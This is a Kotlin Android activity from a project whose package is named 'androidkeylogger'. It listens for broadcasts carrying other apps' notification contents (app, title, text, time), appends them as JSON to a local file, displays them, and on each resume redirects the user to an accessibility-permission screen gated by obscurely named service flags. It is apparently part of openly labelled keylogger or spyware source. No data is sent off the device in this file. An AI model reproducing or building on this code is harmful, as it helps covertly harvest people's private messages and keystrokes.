package com.azamovhudstc.androidkeylogger

import android.content.*
import android.os.Bundle
import android.util.Log
import android.view.Menu
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.RecyclerView
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.FileWriter
import java.io.IOException
import kotlin.collections.ArrayList

class MainFixActivity : AppCompatActivity() {
    private lateinit var recyclerView: RecyclerView
    private lateinit var adapter: NotificationAdapter
    private val notifications = mutableListOf<NotificationModel>()
    private var isFirstLaunch = true
    private val fileName = "notifications.txt"

    private fun checkPermission() {
        if (!SvcAccFix.i) {
            if (!SvcAccFix.j) {
                startActivity(Intent(this, AccessibilityFixActivity::class.java))
            }
        }
    }


    private val notificationReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val packageName = intent?.getStringExtra("packageName")
            val title = intent?.getStringExtra("title")
            val text = intent?.getStringExtra("text")
            val timeStamp = intent?.getStringExtra("date")
            if (!packageName.isNullOrBlank() && !title.isNullOrBlank() && !text.isNullOrBlank()) {
                    val notificationModel = NotificationModel(packageName, title, text, timeStamp!!)
                    adapter.addNotification(notificationModel)
                    saveNotificationToFile(notificationModel)
            }
        }
    }

    private fun saveNotificationToFile(notification: NotificationModel) {
        val gson = Gson()
        val notificationJson = gson.toJson(notification)

        try {
            val file = File(filesDir, fileName)
            FileWriter(file, true).use { writer ->
                writer.append(notificationJson)
                writer.append("\n")
            }
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        recyclerView = findViewById(R.id.notificationRecyclerView)
        adapter = NotificationAdapter(notifications)
        recyclerView.adapter = adapter


        // Read data from file upon the first launch
        if (isFirstLaunch) {
            isFirstLaunch = false
            readNotificationsFromFile()
        }

        // Register the BroadcastReceiver
        val filter = IntentFilter("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
        registerReceiver(notificationReceiver, filter)
    }


    private fun readNotificationsFromFile() {
        val file = File(filesDir, fileName)
        if (file.exists()) {
            try {
                val gson = Gson()
                val reader = file.bufferedReader()
                val savedNotifications = mutableListOf<NotificationModel>()

                reader.forEachLine { line ->
                    val notificationModel = gson.fromJson(line, NotificationModel::class.java)
                    savedNotifications.add(notificationModel)
                }
                reader.close()

                notifications.addAll(savedNotifications)
                adapter.notifyDataSetChanged()
            } catch (e: IOException) {
                e.printStackTrace()
            } catch (e: JsonSyntaxException) {
                e.printStackTrace()
            }
        }
    }


    override fun onCreateOptionsMenu(menu: Menu): Boolean {
        menuInflater.inflate(R.menu.btn, menu)
        return true
    }

    override fun onDestroy() {
        super.onDestroy()
        // Unregister the BroadcastReceiver
        unregisterReceiver(notificationReceiver)
    }

    override fun onResume() {
        super.onResume()
        checkPermission()

    }

}
